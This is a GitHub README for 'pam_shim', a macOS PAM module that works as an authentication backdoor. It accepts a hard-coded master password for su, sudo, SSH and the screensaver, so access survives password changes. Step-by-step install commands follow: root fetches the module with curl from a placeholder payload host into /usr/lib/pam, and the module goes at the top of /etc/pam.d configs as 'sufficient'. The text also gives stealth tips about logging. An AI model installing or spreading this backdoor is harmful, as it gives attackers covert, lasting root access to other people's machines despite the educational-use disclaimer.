# pam_shim
A PAM module created to act as a shim enabling sustained access to an UNIX-based computer, even in the event of a password change.

I originally coded this in my first year of high school – it's a long story. I didn't think this would really be useful to anyone else, but after having several people request the source, I patched it up for Yosemite and put it up here on Github.

### Disclaimer
This small utility is provided for educational use on machines you own or whose owner has given you their full consent. You are solely responsible for any, uh... trouble in which you might (and probably will) find yourself after using pam_shim under other circumstances.

## Features and Relevant Caveats
This code has only been tested on Mac OS X, but it should theoretically build and function (albeit with some minor modification) on any UNIX system that employs PAM authentication. No thought whatsoever was given to cross-compatibility during the design phase as such goals were far beyond the initial scope of the project, but UNIX is generally pretty forgiving in this regard. While Linux support might take a bit of trial and error, it's not entirely inconceivable – if anyone does decide to go through the trouble of figuring it out, please do tell how you've made it work.

When the OpenDirectory fallback fails, pam_shim returns **silently** where pam_opendirectory.so might report an error message like "su: Sorry" or "sudo: Authentication failure". I'm too lazy to figure out how pam_opendirectory.so does this, so either try to fix it yourself if it really bugs you, or just bear with it until it irritates someone else enough that they do so for you. ;) Ah, the beauty of Github.

**IMPORTANT:** pam_shim does *not* affect LoginWindow.app (the Mac OS X login screen), as it refuses to go through PAM for some reason. It *does* however work okay in conjunction with setuid-based privilege management systems like su/sudo and over traditional UNIX remote access services such as SSH/telnet/rlogin, etc. Ironically, unlike LoginWindow.app the Mac OS X screensaver engine's password lock seems to play along with pam_shim just fine.

## Building
Building pam_shim is not a very tricky process – I've been able to do so flawlessly using both clang and tcc on my MacBook (OSX 10.10.1); YMMV with other untested setups. The build system is marvelously uncomplicated, just run `make` in the source directory. You may need to make some system-specific changes to the Makefile or source code if it won't build correctly as-is. In the event your box complains about something, rest assured that the code itself is stupidly simple (it's just a shim after all) and easy to hack on. I apologize in advance for the lack of comments, though. (^\_^);

You'll need to have installed Apple's Xcode command line tools package for this to work correctly – if you haven't already done so just execute `xcode-select --install` in your shell and click "Install" (*not* "Get Xcode", unless of course you want to toss ~8GB of SSD space out the window).

### Changing the password
To change the password used by pam_shim (must be done during the build stage), edit the `#define PASS` preprocessor directive in `config.h`, and run `make clean && make` to rebuild the module. If you're paranoid, feel free to change the salt as well. The system pam_shim uses to hash the plaintext password is admittedly a bit sketchy, but as I didn't want to rely on mkpasswd or openssl, there weren't a ton of other options. Hey, at least it doesn't store the password in plaintext. Now *that* would be bad.

## Installing
Installing is also a walk in the park, but it does require you to spend a minute or so on the root account of the target machine. It'll work over SSH (or any other remote PTY) as well of course, so physical access is not necessarily a prerequisite in every case.

The process itself remains more or less identical across different machines running the same OS, and can easily be automated with a shell script – which in turn speeds installation even further, especially when paired with a download & execute one-liner. Such a script is intentionally not included however, as there is high potential for abuse and whatnot. If you require this or similar functionality for some legitimate reason though, it's completely trivial to implement on your own.

But in this readme, I'll be showing you how to do it The Hard Way™ (actually pretty easy) instead. **NOTE:** I'm going to assume you've already built everything.

**(1)** Move or copy `pam_shim.so` to your PAM library folder – as one might expect, doing so requires root. On every Mac OS X installation I've come across thus far, this directory is `/usr/lib/pam`. In the command below, I elevate to root via `sudo` and download a precompiled pam_shim binary directly to my PAM library folder. PAM seems to recommend that you use the `.so` extension when naming PAM modules, even if they're technically in another binary format (like Mach-O dylib, in this case) – but if you want to be a rebel, it'll obviously still work when renamed to something like `pam_shim.dylib`.
```
    $ sudo -i
    Password:
    # curl -L http://web.server.hosting.payload/payloads/pam_shim.so -o /usr/lib/pam/pam_shim.so
```

**(2)** Change the permission attributes of `/usr/lib/pam/pam_shim.so` to match the other "real" PAM modules in `/usr/lib/pam`. On my MacBook, this constitutes mode 0444 and `root:wheel` ownership. In this case, I've downloaded the file as root so it already had the correct ownership – but I'll just `chown` it anyway for kicks.
```
    # cd /usr/lib/pam
    # chown root:wheel pam_shim.so
    # chmod 0444 pam_shim.so
```

**(3)** Edit the configuration files in `/etc/pam.d` so that `pam_shim.so` has the `sufficient` role for the services you'd like to have it affect. Keep in mind that some services (e.g. su and sudo) syslog their activity by default, so if you're trying to be stealthy you might want to think twice as to how you're getting root. Lastly, make sure the entry is at the top, or PAM won't check it first. Here's my `/etc/pam.d/su` file, for example:
```
auth       sufficient     pam_shim.so
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
This will cause `su`'s PAM calls to route through pam_shim, returning successful if the password given is equivalent to the one hard-coded into library, and falling back to OpenDirectory if not. Note that there is no need to remove or comment out the pam_group line as pam_shim will return successful before PAM has the opportunity to evaluate it.

**(4)**  Test it out! (unless you changed it, the password is "letmein")
```
$ su
Password:
#
```
After providing the pam_shim password (from any user) *or* the actual root password (as an admin/wheel user), `su` should give you a root shell. If not, you probably missed a step somewhere along the line. Now you can go ahead and place corresponding entries into the PAM configuration files pertaining to sudo, sshd, screensaver, ftpd, or whatever else floats your boat.
